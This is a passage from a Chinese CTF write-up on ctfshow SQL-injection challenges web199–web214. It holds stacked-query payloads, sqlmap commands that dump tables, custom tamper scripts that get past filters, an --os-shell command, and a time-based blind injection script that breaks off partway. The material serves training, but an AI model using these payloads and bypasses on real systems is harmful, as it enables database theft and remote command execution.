punctuation">&#125;</span></code></pre><p><strong>方法一</strong>：本题依然可以使用<code>show tables</code>。</p><p><strong>方法二</strong>：本题过滤了括号，限制了之前payload中的varchar(100)，可以改为text。</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;alter table ctfshow_user change &#96;pass&#96; &#96;tmp&#96; text;alter table ctfshow_user change &#96;username&#96; &#96;pass&#96; text;alter table ctfshow_user change &#96;tmp&#96; &#96;username&#96; text;</code></pre><h4 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h4><p>增加了逗号的过滤，不影响。web199的两个方法都可以用。</p><h4 id="web201-Sqlmap-–referer"><a href="#web201-Sqlmap-–referer" class="headerlink" title="web201(Sqlmap –referer)"></a>web201(Sqlmap –referer)</h4><p><a href="https://sqlmap.highlight.ink/"><a href="https://sqlmap.highlight.ink/">sqlmap 用户手册</a></a></p><p>SQLmap使用顺序：</p><ol><li>获取当前MySQL中的所有数据库<code>sqlmap -u http://xxx</code></li><li>获取当前数据库名字</li><li>获取数据库下的数据表</li><li>获取表下的列名</li><li>导出数据</li></ol><p><img src="web201.png" loading="lazy"></p><p><a href="https://blog.csdn.net/qq_43621629/article/details/104515866">Sqlmap 性能优化</a></p><p>设置多线程</p><pre class="language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://127.0.0.1/sqli/Less-1/?id=1"</span> <span class="token parameter variable">--threads</span><span class="token operator">=</span><span class="token number">5</span> <span class="token parameter variable">--banner</span> <span class="token parameter variable">-v</span> <span class="token number">5</span></code></pre><p>要添加一个referer头</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">查数据库：python sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -dbs</code></pre><p><img src="web201_2.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">查表名：python sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web --tables</code></pre><p><img src="web201_3.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">查列名：python sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user --columns</code></pre><p><img src="web201_4.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">查Flag：python sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><p><img src="web201_5.png" loading="lazy"></p><h4 id="web202-–data"><a href="#web202-–data" class="headerlink" title="web202(–data)"></a>web202(–data)</h4><p>–data&#x3D;DATA         该参数指定的数据会被作为POST数据提交</p><p>使用post方式进行注入，可以直接用<code>--data=&quot;id=1&quot;</code>，也可以<code>--method=post</code>来触发</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1.使用data调整参数python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot;2.查库python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --dbs3.查表python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web --tables4.查列python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user --columns5.查Flagpython sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><h4 id="web203-–method-PUT"><a href="#web203-–method-PUT" class="headerlink" title="web203(–method&#x3D;PUT)"></a>web203(–method&#x3D;PUT)</h4><p><strong>HTTP <code>PUT</code> 请求方法</strong>创建一个新的资源或用请求的有效载荷替换目标资源的表示。</p><p><code>PUT</code> 与 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a> 方法的区别是，<code>PUT</code> 方法是幂等的：调用一次与连续调用多次效果是相同的（即没有<em>副</em>作用），而连续调用多次相同的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a> 方法可能会有副作用，比如多次提交同一订单。</p><p>指定<code>--method=PUT</code>方法，同时**加上<code>--headers=&quot;Content-Type:text/plain</code>**，否则put接受不了。同时，要加上index.php，<code>url/api/index.php</code></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;6792f785-47eb-4ea4-b098-0123488759c4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><h4 id="web204-–cookie"><a href="#web204-–cookie" class="headerlink" title="web204(–cookie)"></a>web204(–cookie)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;87742487-acec-4728-91da-8113d95b32cf.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;9tgbnd43m59t71te1u80d66pjs; ctfshow&#x3D;8c61071229d48923c7ced01b20ec493e&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;87742487-acec-4728-91da-8113d95b32cf.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;9tgbnd43m59t71te1u80d66pjs; ctfshow&#x3D;8c61071229d48923c7ced01b20ec493e&quot; --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql dbs&#x3D;ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><h4 id="web205-api权限"><a href="#web205-api权限" class="headerlink" title="web205(api权限)"></a>web205(api权限)</h4><p>api调用需要鉴权</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">--</span>safe<span class="token operator">-</span>url 设置在测试目标地址前访问的安全链接<span class="token operator">--</span>safe<span class="token operator">-</span>freq 设置两次注入测试前访问安全链接的次数</code></pre><p>通过F12中network抓包可以看见，有一个<code>getToken.php</code>的请求token的动作；</p><p><img src="web205.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;a530a88b-1bce-49ce-bfee-18b37febf906.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;bllqt44686hm6msc9ti5ruevpb&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;a530a88b-1bce-49ce-bfee-18b37febf906.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql -D ctfshow_web -T ctfshow_flax -C flagx --dump</code></pre><p>这个题换了表名和列名</p><h4 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h4><p>sql需要闭合，sqlmap会自动闭合，Payload同上</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;34b88ba2-58d2-4a8c-9b6f-3b1b0e663a27.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;3ehcblk49o3nqd3hp3nqsdr0ga&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;34b88ba2-58d2-4a8c-9b6f-3b1b0e663a27.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql -D ctfshow_web -T ctfshow_flaxc -C flagv --dump</code></pre><h4 id="web207-–tamper"><a href="#web207-–tamper" class="headerlink" title="web207(–tamper)"></a>web207(–tamper)</h4><p><a href="https://y4er.com/posts/sqlmap-tamper/">Sqlmap Tamper 编写</a></p><p><code>--batch</code>使用默认的选项进行注入，无需用户输入和交互<br><code>--prefix=PREFIX</code>指定payload的前缀<br><code>--suffix=SUFFIX</code>指定payload的后缀</p><p>题目对空格进行了过滤，所以我们可以考虑用space2comment.py这个脚本，将空格转换成注释符来绕过</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --data&#x3D;&quot;id&#x3D;1&quot; --prefix&#x3D;&quot;&#39;)&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump --batch --tamper&#x3D;space2comment</code></pre><h4 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h4><p>对小写的<code>select</code>和空格进行了绕过，不过sqlmap中的select都是大写的</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">import</span> os<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>common <span class="token keyword">import</span> singleTimeWarnMessage<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> DBMS<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>HIGHEST<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"SELECT"</span><span class="token punctuation">,</span> <span class="token string">"select"</span><span class="token punctuation">)</span><span class="token comment">#就修改这一行了</span>    <span class="token keyword">return</span> payload</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --data&#x3D;&quot;id&#x3D;1&quot; --prefix&#x3D;&quot;&#39;)&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump --batch --tamper&#x3D;space2comment</code></pre><h4 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h4><p>过滤了<code> </code>，<code>*</code>号和<code>=</code>，</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;d5249ee4-9520-4049-a7f0-d3cc15ccc88a.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;d5249ee4-9520-4049-a7f0-d3cc15ccc88a.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;1763p4504m3dcol5349rfgt5q9&quot; --tamper web209.py -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump --batch</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)See the file 'LICENSE' for copying permission"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Replaces space character (' ') with comments '/**/'    Tested against:        * Microsoft SQL Server 2005        * MySQL 4, 5.0 and 5.5        * Oracle 10g        * PostgreSQL 8.3, 8.4, 9.0    Notes:        * Useful to bypass weak and bespoke web application firewalls    >>> tamper('SELECT id FROM users')    'SELECT/**/id/**/FROM/**/users'    """</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token string">"/**/"</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x2A</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'like'</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                <span class="token comment"># retVal += "/**/"</span>                retVal <span class="token operator">+=</span> char<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal</code></pre><h4 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//对查询字符进行解密</span>  <span class="token keyword">function</span> <span class="token function-definition function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>      </code></pre><p>对传入的id 进行解密处理 从而让sql语句无法执行成功 </p><p>按照他的方式 反着构造一个加密脚本 这样传进去后 服务器对id进行一系列操作就变成了 我们想到的id的值了</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;30e6ea25-0680-4bf6-af39-8be519b7bd22.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;30e6ea25-0680-4bf6-af39-8be519b7bd22.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;9j6o3g1dvnmvg061n1kbjlruvp&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch</code></pre><p><strong>web210.py</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Author:Y4tacker"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY<span class="token keyword">import</span> base64__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    retVal <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> retVal<span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal</code></pre><h4 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h4><p>过滤了 在web210的基础上过滤了空格 将空格替换成%0a，但是之前脚本依旧可以</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;f2caf00e-910a-4b69-9561-e6da6b0fb648.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f2caf00e-910a-4b69-9561-e6da6b0fb648.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;vueov0jlmgnnbpnr8bgovga6r8&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump --batch</code></pre><h4 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h4><p>多过滤了<code>*</code>，Payload同上</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;c9220216-1978-4f6d-afa6-3fbba4ac7dfb.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;c9220216-1978-4f6d-afa6-3fbba4ac7dfb.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;4ob2ad7so7hia0pjdds9df53rj&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump --batch</code></pre><h4 id="web213-–os-shell"><a href="#web213-–os-shell" class="headerlink" title="web213(–os-shell)"></a>web213(–os-shell)</h4><p>使用刚才的tamper脚本就行，但是最后使用<code>--os-shell</code>进入shell交互就行</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;a3fc1f89-804d-42f5-a05a-16a174522da2.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;ctf.show --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;mqte5lhv097hu0km2aq9c4qqri&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;a3fc1f89-804d-42f5-a05a-16a174522da2.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web210.py --os-shell</code></pre><h4 id="web214-时间盲注"><a href="#web214-时间盲注" class="headerlink" title="web214(时间盲注)"></a>web214(时间盲注)</h4><p>刷新首页抓包得到注入点(我用https的时候没抓到，http就可以了)</p><p><img src="web214.png" loading="lazy"></p><p>然后就是进行时间盲注</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://8b0ff336-3094-4316-b708-b0d88f596b52.challenge.ctf.show/api/"</span>i <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        <span class="token comment"># 查库名</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># 查表名  ctfshow_flagx,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查列名  id,flaga,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flaga from ctfshow_flagx"</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token 